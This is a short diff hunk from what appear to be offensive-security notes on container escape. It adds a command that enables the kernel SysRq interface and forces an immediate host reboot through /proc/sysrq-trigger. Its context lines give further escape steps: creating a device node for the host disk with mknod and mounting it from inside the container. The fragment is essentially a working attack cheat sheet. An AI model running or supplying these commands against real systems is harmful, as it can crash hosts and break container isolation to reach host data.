@@ -52,6 +52,7 @@ kernel-exploits
 
 container escape
 	check for container echo 1 > /proc/sysrq-trigger
+	echo 1 > /proc/sys/kernel/sysrq && echo b > /proc/sysrq-trigger # reboot host using magic keys
 	make a new drive and point it to host
 	mknod xvda1 b 202 1
 	mount xvda1 /mnt
